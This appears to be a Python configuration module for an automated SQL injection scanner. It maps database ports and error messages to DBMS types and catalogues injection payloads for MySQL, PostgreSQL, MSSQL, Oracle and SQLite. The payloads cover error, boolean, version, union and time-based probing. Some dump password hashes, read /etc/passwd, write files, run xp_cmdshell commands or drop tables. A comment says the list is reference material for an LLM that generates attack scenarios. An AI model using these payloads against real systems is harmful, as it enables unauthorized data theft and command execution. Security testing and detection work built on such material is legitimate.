from .models import DBMSType


# Nmap이 DB 포트로 식별하는 기준 (Phase 0)
NMAP_PORT_MAP: dict[int, DBMSType] = {
    3306:  DBMSType.MYSQL,
    5432:  DBMSType.POSTGRESQL,
    1433:  DBMSType.MSSQL,
    1434:  DBMSType.MSSQL,   # SQL Server Browser (UDP)
    1521:  DBMSType.ORACLE,
    1522:  DBMSType.ORACLE,
    1526:  DBMSType.ORACLE,
}

NMAP_SERVICE_MAP: dict[str, DBMSType] = {
    "mysql":      DBMSType.MYSQL,
    "postgresql": DBMSType.POSTGRESQL,
    "ms-sql-s":   DBMSType.MSSQL,
    "ms-sql-m":   DBMSType.MSSQL,
    "oracle":     DBMSType.ORACLE,
    "oracle-tns": DBMSType.ORACLE,
}

# Phase 1: 에러 유발 기본 페이로드 (Nmap http-sql-injection.nse 참고)
ERROR_PROBES = ["'", "' OR sqlspider", '"', "' --", "')--"]

# Phase 1: 에러 메시지 → DBMS 매핑
# 출처: Nmap nselib/data/http-sql-errors.lst (fuzzdb 기반) + 추가 패턴
ERROR_PATTERNS: list[tuple[str, DBMSType]] = [
    # MySQL
    ("you have an error in your sql syntax",                    DBMSType.MYSQL),
    ("check the manual that corresponds to your mysql server",  DBMSType.MYSQL),
    ("mysql error",                                             DBMSType.MYSQL),
    ("mysql driver",                                            DBMSType.MYSQL),
    ("mysql odbc",                                              DBMSType.MYSQL),
    ("jdbc mysql",                                              DBMSType.MYSQL),
    ("mysql_query()",                                           DBMSType.MYSQL),
    ("mysql_fetch_array()",                                     DBMSType.MYSQL),
    ("supplied argument is not a valid mysql result resource",  DBMSType.MYSQL),
    ("mymysql error with query",                                DBMSType.MYSQL),
    ("warning: mysql_query()",                                  DBMSType.MYSQL),
    # PostgreSQL
    ("postgresql query failed",                                 DBMSType.POSTGRESQL),
    ("syntax error at or near",                                 DBMSType.POSTGRESQL),
    ("pg_query()",                                              DBMSType.POSTGRESQL),
    ("supplied argument is not a valid postgresql result",      DBMSType.POSTGRESQL),
    ("warning: pg_connect()",                                   DBMSType.POSTGRESQL),
    # MSSQL
    ("microsoft ole db provider for sql server",                DBMSType.MSSQL),
    ("microsoft sql native client error",                       DBMSType.MSSQL),
    ("sql server driver",                                       DBMSType.MSSQL),
    ("sql server jdbc driver",                                  DBMSType.MSSQL),
    ("odbc sql server",                                         DBMSType.MSSQL),
    ("unclosed quotation mark",                                 DBMSType.MSSQL),
    ("incorrect syntax near",                                   DBMSType.MSSQL),
    # Oracle
    ("ora-0",                                                   DBMSType.ORACLE),
    ("ora-1",                                                   DBMSType.ORACLE),
    ("microsoft ole db provider for oracle",                    DBMSType.ORACLE),
    ("oracle driver",                                           DBMSType.ORACLE),
    ("oracle error",                                            DBMSType.ORACLE),
    ("jdbc oracle",                                             DBMSType.ORACLE),
    ("sql command not properly ended",                          DBMSType.ORACLE),
    # SQLite
    ("sqlite3.operationalerror",                                DBMSType.SQLITE),
    ("sqlite error",                                            DBMSType.SQLITE),
]

# Phase 2: Boolean-based DBMS 식별
# (DBMS, 참 페이로드, 거짓 페이로드)
# 각 DBMS 고유 시스템 카탈로그를 참조 → 다른 DBMS에서는 에러로 양쪽 응답 동일 → 부수 매칭 제거
# 참: COUNT(*) > 0 (시스템 테이블에 데이터 있으면 참)
# 거짓: COUNT(*) < 0 (COUNT는 음수가 안 나오므로 항상 거짓)
# 출처: Nmap NSE (mysql-databases.nse, ms-sql-info.nse, oracle-*.nse 등)
BOOLEAN_PROBES: list[tuple[DBMSType, str, str]] = [
    (DBMSType.MYSQL,      "' AND (SELECT COUNT(*) FROM information_schema.engines)>0-- -",
                          "' AND (SELECT COUNT(*) FROM information_schema.engines)<0-- -"),
    (DBMSType.POSTGRESQL, "' AND (SELECT COUNT(*) FROM pg_database)>0-- -",
                          "' AND (SELECT COUNT(*) FROM pg_database)<0-- -"),
    (DBMSType.MSSQL,      "' AND (SELECT COUNT(*) FROM master..sysdatabases)>0-- -",
                          "' AND (SELECT COUNT(*) FROM master..sysdatabases)<0-- -"),
    (DBMSType.ORACLE,     "' AND (SELECT COUNT(*) FROM v$version)>0-- -",
                          "' AND (SELECT COUNT(*) FROM v$version)<0-- -"),
    (DBMSType.SQLITE,     "' AND (SELECT COUNT(*) FROM sqlite_master)>0-- -",
                          "' AND (SELECT COUNT(*) FROM sqlite_master)<0-- -"),
]

# Phase 3: 버전 추출 Boolean 페이로드
# (버전 레이블, 확인 페이로드)
VERSION_PROBES: dict[DBMSType, list[tuple[str, str]]] = {
    DBMSType.MYSQL: [
        ("9.x", "' AND MID(@@version,1,1)='9'-- -"),
        ("8.x", "' AND MID(@@version,1,1)='8'-- -"),
        ("5.x", "' AND MID(@@version,1,1)='5'-- -"),
    ],
    DBMSType.POSTGRESQL: [
        ("17.x", "' AND SPLIT_PART(version(),' ',2) LIKE '17.%'-- -"),
        ("16.x", "' AND SPLIT_PART(version(),' ',2) LIKE '16.%'-- -"),
        ("15.x", "' AND SPLIT_PART(version(),' ',2) LIKE '15.%'-- -"),
        ("14.x", "' AND SPLIT_PART(version(),' ',2) LIKE '14.%'-- -"),
        ("13.x", "' AND SPLIT_PART(version(),' ',2) LIKE '13.%'-- -"),
    ],
    DBMSType.MSSQL: [
        ("2022", "' AND @@VERSION LIKE '%2022%'-- -"),
        ("2019", "' AND @@VERSION LIKE '%2019%'-- -"),
        ("2017", "' AND @@VERSION LIKE '%2017%'-- -"),
        ("2016", "' AND @@VERSION LIKE '%2016%'-- -"),
        ("2014", "' AND @@VERSION LIKE '%2014%'-- -"),
    ],
    DBMSType.ORACLE: [
        ("21c", "' AND (SELECT BANNER FROM v$version WHERE ROWNUM=1) LIKE '%21c%'-- -"),
        ("19c", "' AND (SELECT BANNER FROM v$version WHERE ROWNUM=1) LIKE '%19c%'-- -"),
        ("12c", "' AND (SELECT BANNER FROM v$version WHERE ROWNUM=1) LIKE '%12c%'-- -"),
    ],
    DBMSType.SQLITE: [
        ("3.x", "' AND SQLITE_VERSION() LIKE '3.%'-- -"),
        ("2.x", "' AND SQLITE_VERSION() LIKE '2.%'-- -"),
    ],
}

# Phase 3 fallback: 에러 메시지에서 버전 직접 파싱
# Boolean 프로빙이 실패할 때 사용 (에러 기반 취약점이 확인된 환경)
# (payload, 버전 추출 정규식)
ERROR_VERSION_PROBES: dict[DBMSType, list[tuple[str, str]]] = {
    DBMSType.MSSQL: [
        ("' AND 1=CONVERT(int,@@VERSION)-- -",  r'microsoft sql server\s+(\d{4})'),
        (" AND 1=CONVERT(int,@@VERSION)-- -",   r'microsoft sql server\s+(\d{4})'),
    ],
    DBMSType.MYSQL: [
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -", r"xpath syntax error:\s*['\"]~?(\d[\d.]*)"),
        ("' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)-- -",  r"xpath syntax error:\s*['\"]~(\d[\d.]*)"),
    ],
    DBMSType.POSTGRESQL: [
        ("' AND CAST(version() AS INT)-- -", r'postgresql\s+(\d+\.\d+)'),
    ],
}

# 시나리오 생성 LLM 참고용: DBMS × 기법별 대표 쿼리
# 출처: Nmap mysql-databases.nse, mysql-dump-hashes.nse, ms-sql-tables.nse,
#        ms-sql-xp-cmdshell.nse, ms-sql-query.nse 등
POSSIBLE_QUERIES: dict[DBMSType, dict[str, list[str]]] = {
    DBMSType.MYSQL: {
        "Error-based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -",
        ],
        "Union-based": [
            "' UNION SELECT NULL-- -",
            "' UNION SELECT NULL,NULL-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
        ],
        "Boolean-based blind": [
            "' AND SUBSTRING(@@version,1,1)='8'-- -",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
        ],
        "Time-based blind": [
            "' AND SLEEP(5)-- -",
            "' AND IF(1=1,SLEEP(5),0)-- -",
        ],
        "Stacked queries": [
            "'; SELECT SLEEP(1)-- -",
            "'; SHOW DATABASES-- -",
        ],
        "Info gathering": [
            "SHOW DATABASES",
            "SHOW TABLES",
            "SELECT DISTINCT CONCAT(user,':',password) FROM mysql.user WHERE password<>''",
            "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        ],
        "File read/write": [
            "' UNION SELECT LOAD_FILE('/etc/passwd')-- -",
            "' INTO OUTFILE '/tmp/test.php'-- -",
        ],
    },
    DBMSType.POSTGRESQL: {
        "Error-based": [
            "' AND CAST(version() AS INT)-- -",
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)-- -",
        ],
        "Union-based": [
            "' UNION SELECT NULL-- -",
            "' UNION SELECT NULL,NULL-- -",
            "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
        ],
        "Boolean-based blind": [
            "' AND SUBSTRING(version(),1,10)='PostgreSQL'-- -",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
        ],
        "Time-based blind": [
            "' AND PG_SLEEP(5)=0-- -",
            "'; SELECT PG_SLEEP(5)-- -",
        ],
        "Stacked queries": [
            "'; SELECT PG_SLEEP(1)-- -",
            "'; DROP TABLE IF EXISTS test-- -",
        ],
        "Info gathering": [
            "SELECT datname FROM pg_database",
            "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
            "SELECT usename,passwd FROM pg_shadow",
        ],
        "File access": [
            "COPY (SELECT '') TO '/tmp/test'",
            "COPY test FROM '/etc/passwd'",
        ],
    },
    DBMSType.MSSQL: {
        "Error-based": [
            "' AND 1=CONVERT(int,(SELECT @@version))-- -",
            "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -",
        ],
        "Union-based": [
            "' UNION SELECT NULL-- -",
            "' UNION SELECT NULL,NULL-- -",
            "' UNION SELECT name,NULL FROM master..sysdatabases-- -",
        ],
        "Boolean-based blind": [
            "' AND SUBSTRING(@@version,1,1)='M'-- -",
            "' AND (SELECT COUNT(*) FROM master..sysdatabases)>0-- -",
        ],
        "Time-based blind": [
            "' WAITFOR DELAY '0:0:5'-- -",
            "' AND 1=(SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:5') t)-- -",
        ],
        "Stacked queries": [
            "'; WAITFOR DELAY '0:0:1'-- -",
            "'; SELECT name FROM master..sysdatabases-- -",
        ],
        "Info gathering": [
            "SELECT @@version",
            "SELECT name FROM master..sysdatabases",
            "SELECT so.name FROM sysobjects so WHERE xtype='U'",
            "SELECT sc.name FROM syscolumns sc WHERE id=OBJECT_ID('tablename')",
        ],
        "xp_cmdshell": [
            "EXEC master..xp_cmdshell 'whoami'",
            "EXEC master..xp_cmdshell 'ipconfig /all'",
            "'; EXEC master..xp_cmdshell 'whoami'-- -",
        ],
    },
    DBMSType.ORACLE: {
        "Error-based": [
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
            "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
        ],
        "Union-based": [
            "' UNION SELECT NULL FROM DUAL-- -",
            "' UNION SELECT NULL,NULL FROM DUAL-- -",
            "' UNION SELECT owner,NULL FROM all_tables WHERE ROWNUM=1-- -",
        ],
        "Boolean-based blind": [
            "' AND (SELECT SUBSTR(banner,1,6) FROM v$version WHERE ROWNUM=1)='Oracle'-- -",
            "' AND (SELECT COUNT(*) FROM all_tables)>0-- -",
        ],
        "Time-based blind": [
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
        ],
        "Info gathering": [
            "SELECT BANNER FROM v$version WHERE ROWNUM=1",
            "SELECT owner FROM all_tables GROUP BY owner",
            "SELECT table_name FROM all_tables WHERE owner='SCHEMA'",
        ],
    },
    DBMSType.SQLITE: {
        "Error-based": [
            "' AND 1=CAST(sqlite_version() AS INTEGER)-- -",
        ],
        "Union-based": [
            "' UNION SELECT NULL-- -",
            "' UNION SELECT NULL,NULL-- -",
            "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -",
        ],
        "Boolean-based blind": [
            "' AND SUBSTR(sqlite_version(),1,1)='3'-- -",
            "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0-- -",
        ],
        "Time-based blind": [
            "' AND 1=(SELECT 1 FROM (SELECT RANDOMBLOB(1000000000))t)-- -",
        ],
        "Info gathering": [
            "SELECT name FROM sqlite_master WHERE type='table'",
            "SELECT sql FROM sqlite_master WHERE type='table' AND name='tablename'",
        ],
    },
    DBMSType.UNKNOWN: {},
}

ERROR_PATTERNS.sort(key=lambda x: len(x[0]), reverse=True)
